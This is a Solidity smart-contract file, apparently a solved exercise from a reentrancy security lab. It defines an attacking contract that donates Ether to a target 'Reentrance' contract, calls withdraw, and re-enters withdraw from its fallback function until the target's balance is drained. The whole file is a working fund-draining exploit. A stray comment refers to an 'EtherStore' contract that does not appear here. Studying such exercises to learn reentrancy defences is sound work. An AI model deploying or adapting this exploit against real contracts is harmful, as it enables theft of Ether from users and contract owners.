// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (contractAddress.balance > 0 ether) {
            Reentrance(contractAddress).withdraw();
        }
    }

    function hackContract() external {
        // Code me!
        Reentrance(contractAddress).donate{value: address(this).balance}(
            address(this)
        );
        Reentrance(contractAddress).withdraw();
    }
}
